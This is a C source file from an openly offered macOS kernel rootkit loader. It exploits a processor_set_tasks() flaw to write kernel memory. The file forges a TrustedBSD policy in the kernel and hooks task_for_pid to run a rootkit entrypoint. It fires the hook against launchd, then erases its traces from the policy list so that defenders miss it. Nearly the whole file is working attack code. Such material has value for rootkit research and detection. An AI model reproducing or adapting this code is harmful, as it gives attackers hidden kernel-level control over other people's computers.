/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'
 *
 * A kernel rootkit loader based on processor_set_tasks() vulnerability
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * trustedbsd.c
 * Functions related to leveraging TrustedBSD to initiate kernel code execution
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "trustedbsd.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <mach/processor_set.h>
#include <mach/mach_vm.h>
#include <sys/param.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>

#include "mac_policy.h"
#include "utils.h"
#include "logging.h"
#include "rootkit.h"
#include "kernel_symbols.h"
#include "kernel_code_exec.h"

/* NOTE: these structures are internal to TrustedBSD and not exposed in public includes */
/* they are stable since the initial implementation but we still have some risk in defining them here */
/* alternative solution is to find reference to entries array and get its offset */
/* since struct mac_policy_conf is public */

#define mpc_t	struct mac_policy_conf *

struct mac_policy_list_element {
    struct mac_policy_conf *mpc;
};

struct mac_policy_list {
	u_int				numloaded;
	u_int 				max;
	u_int				maxindex;
	u_int				staticmax;
	u_int				chunks;
	u_int				freehint;
	struct mac_policy_list_element	*entries;
};

typedef struct mac_policy_list mac_policy_list_t;

kern_return_t
install_trustedbsd_policy(mach_port_t kernel_port, struct kernel_info *kinfo, mach_vm_address_t entrypoint_addr)
{
    OUTPUT_MSG("\n-----[ Installing TrustedBSD policy ]-----");
    kern_return_t kr = 0;
    
    /* retrieve location and contents of mac_policy_list */
    /* this is TrustedBSD core structure */
    mach_vm_address_t mac_policy_list_addr = solve_kernel_symbol(kinfo, "_mac_policy_list");

    struct mac_policy_list policy_list = {0};
    if (readkmem(kernel_port, (void*)&policy_list, mac_policy_list_addr, sizeof(struct mac_policy_list)) != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to read mac policy list.");
        return KERN_FAILURE;
    }
    
    DEBUG_MSG("Number of active TrustedBSD policies: %d", policy_list.numloaded);
    DEBUG_MSG("Entries array address: 0x%llx", (mach_vm_address_t)policy_list.entries);
    
    /* allocate and write a mac_policy_ops structure
     * this structure holds the function pointers for the TrustedBSD hooks
     * allows us to execute kernel code when the TrustedBSD hook is called
     */
    /* for example, use the task_for_pid() hook to execute our entry function */
    /* in this case the address is from the parameter exec_addr */
    DEBUG_MSG("Configuring mac_policy_ops with rootkit entrypoint to address 0x%llx", entrypoint_addr);
    struct mac_policy_ops policy_ops = {0};
    policy_ops.mpo_proc_check_get_task = (mpo_proc_check_get_task_t*)(entrypoint_addr);

    mach_vm_address_t ops_kernel_addr = 0;
    kr = alloc_and_write_data_kmem(kernel_port, (void*)&policy_ops, sizeof(struct mac_policy_ops), &ops_kernel_addr);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate and write a new mac_policy_ops");
        return KERN_FAILURE;
    }
    DEBUG_MSG("Allocated new mac_policy_ops at address 0x%llx", ops_kernel_addr);
    
    /* this is the core structure for a new policy */
    /* configures things like policy name and options, and points to the mac_policy_ops structure
     * that contains all the function pointers on TrustedBSD hooks we are interested in
     */
    struct mac_policy_conf policy_conf =
    {
        .mpc_name            = NULL,    /* we can leave this empty and avoid allocating space for names */
        .mpc_fullname        = NULL,    /* there is a check for NULL but only when installing a legit TrustedBSD policy */
        .mpc_labelnames      = NULL,    /* since we are bypassing mac_policy_register() there's no problem */
        .mpc_labelname_count = 0,
        .mpc_ops             = (struct mac_policy_ops*)ops_kernel_addr,
        .mpc_loadtime_flags  = 0,
        .mpc_field_off       = NULL,
        .mpc_runtime_flags   = 0
    };
    
    mach_vm_address_t conf_kernel_addr = 0;
    kr = alloc_and_write_data_kmem(kernel_port, (void*)&policy_conf, sizeof(struct mac_policy_conf), &conf_kernel_addr);
    if (kr != 0)
    {
        ERROR_MSG("Failed to allocate memory for mac_policy_conf.");
        return KERN_FAILURE;
    }
    DEBUG_MSG("Allocated new mac_policy_conf at 0x%llx", conf_kernel_addr);
    
    /*
     * at this point we already have the necessary structures and data in kernel memory
     * what's left is to active the policy by changing the global mac_policy_list structure fields
     * three things need to be done:
     * - increase maxindex
     * - increase numloaded
     * - point the entry in entries array to our new policy_conf
     */

    /* the position of our new entry */
    mach_vm_address_t new_entry_addr = (mach_vm_address_t)policy_list.entries + sizeof(intptr_t) * policy_list.numloaded;
    /* there's a NULL pointer check against entries in this array but let's write it first anyway */
    kr = mach_vm_write(kernel_port, new_entry_addr, (vm_offset_t)&conf_kernel_addr, sizeof(uint64_t));
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to activate our TrustedBSD policy entry");
        return KERN_FAILURE;
    }
    DEBUG_MSG("Wrote rootkit TrustedBSD policy entry at address 0x%llx.", new_entry_addr);

    /* last step that finally activates the policy is to increase the numloaded and maxindex */

    /* activate policy by increasing maxindex */
    size_t maxindex_offset = offsetof(mac_policy_list_t, maxindex);
    vm_offset_t new_maxindex = policy_list.maxindex + 1;
    mach_msg_type_number_t maxindex_size = sizeof(u_int);
    
    kr = mach_vm_write(kernel_port, mac_policy_list_addr + maxindex_offset, (vm_offset_t)&new_maxindex, maxindex_size);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to update mac_policy_list maxindex field");
        return KERN_FAILURE;
    }
    
    size_t numloaded_offset = offsetof(mac_policy_list_t, numloaded);
    vm_offset_t new_numloaded = policy_list.numloaded + 1;
    mach_msg_type_number_t numloaded_size = sizeof(u_int);
    
    kr = mach_vm_write(kernel_port, mac_policy_list_addr + numloaded_offset, (vm_offset_t)&new_numloaded, numloaded_size);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to update mac_policy_list numloaded field");
        return KERN_FAILURE;
    }
    
    /* at this point we have everything installed so we just need to call the function that will call our hook */
    
    OUTPUT_MSG("\n-----[ Rootkit kernel execution is now possible, executing task_for_pid() to start the rootkit! ]-----");
    /* execute task_for_pid() against PID 1 (launchd) which is assured to always exist */
    mach_port_t execution_port = 0;
    if (task_for_pid(mach_task_self(), 1, &execution_port) == KERN_SUCCESS)
    {
        OUTPUT_MSG("\n-----[ Rootkit executed successfully, cleaning up our TrustedBSD traces ]-----");
        /* we just executed policy so disable it to not execute again */
        new_maxindex = policy_list.maxindex;
        kr = mach_vm_write(kernel_port, mac_policy_list_addr + maxindex_offset, (vm_offset_t)&new_maxindex, maxindex_size);
        if (kr != KERN_SUCCESS)
        {
            ERROR_MSG("Failed to update mac_policy_list maxindex field");
            return KERN_FAILURE;
        }
        new_numloaded = policy_list.numloaded;
        kr = mach_vm_write(kernel_port, mac_policy_list_addr + numloaded_offset, (vm_offset_t)&new_numloaded, numloaded_size);
        if (kr != KERN_SUCCESS)
        {
            ERROR_MSG("Failed to update mac_policy_list numloaded field");
            return KERN_FAILURE;
        }
        /* clean up all our traces in the TrustedBSD data structures */
        if (zero_and_dealloc_kmem(kernel_port, conf_kernel_addr, sizeof(struct mac_policy_conf)) != KERN_SUCCESS)
        {
            return KERN_FAILURE;
        }
        if (zero_and_dealloc_kmem(kernel_port, ops_kernel_addr, sizeof(struct mac_policy_ops)) != KERN_SUCCESS)
        {
            return KERN_FAILURE;
        }
        uint64_t zero = 0;
        if (mach_vm_write(kernel_port, new_entry_addr, (vm_offset_t)&zero, sizeof(uint64_t)) != KERN_SUCCESS)
        {
            ERROR_MSG("Failed to cleanup entry arrary.");
            return KERN_FAILURE;
        }
    }
    
    /* all done, rootkit is loaded and already took control */
    OUTPUT_MSG("\n-----[ All done, enjoy your kernel code ;-) ]-----\n");
    return KERN_SUCCESS;
}
